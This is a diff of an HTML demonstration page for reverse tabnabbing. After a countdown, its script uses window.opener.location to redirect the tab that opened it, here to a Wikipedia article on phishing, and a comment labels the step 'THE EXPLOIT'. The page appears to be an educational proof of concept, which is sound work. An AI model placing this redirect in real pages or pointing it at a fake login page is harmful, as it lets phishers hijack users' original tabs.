@@ -14,36 +14,43 @@
             background-color: #f8f9fa; 
         }
         .container { text-align: center; }
-        button { 
-            padding: 15px 30px; 
-            font-size: 18px; 
-            font-weight: bold;
-            cursor: pointer; 
-            background-color: #4285F4; 
-            color: white; 
-            border: none; 
-            border-radius: 5px;
-        }
+        #timer { margin-top: 20px; color: #d9534f; font-size: 18px; font-weight: bold; }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <h1>You've reached the external site!</h1>
-        <p>In the background, your original tab has been hijacked.</p>
-        <button onclick="launchTabs()">Go Back (Simulated)</button>
+        <h1>External Resource Loaded</h1>
+        <p>The original tab will be redirected shortly...</p>
+        <div id="timer">Redirecting original tab in: 7s</div>
     </div>
 
     <script>
-        // This runs the moment the page loads
-        if (window.opener) {
-            // This redirects the TAB THAT OPENED THIS PAGE
-            window.opener.location = "https://en.wikipedia.org/wiki/Phishing";
-        }
+        let secondsLeft = 7;
+        const timerElement = document.getElementById('timer');
 
-        function launchTabs() {
-            alert("The exploit has already triggered in the other tab!");
-        }
+        // 1. Create a countdown visual (Optional, just for the demo)
+        const countdown = setInterval(() => {
+            secondsLeft--;
+            timerElement.innerText = `Redirecting original tab in: ${secondsLeft}s`;
+            if (secondsLeft <= 0) clearInterval(countdown);
+        }, 1000);
+
+        // 2. THE EXPLOIT: Execute the redirect after 7000ms (7 seconds)
+        setTimeout(function() {
+            if (window.opener) {
+                try {
+                    // Redirect the original tab to the fake page
+                    window.opener.location = "https://en.wikipedia.org/wiki/Phishing";
+                    timerElement.innerText = "Original tab redirected!";
+                    timerElement.style.color = "green";
+                } catch (e) {
+                    timerElement.innerText = "Redirect failed. Browser blocked access.";
+                }
+            } else {
+                timerElement.innerText = "No 'opener' detected (Modern browser protection active).";
+            }
+        }, 7000); 
     </script>
 
 </body>
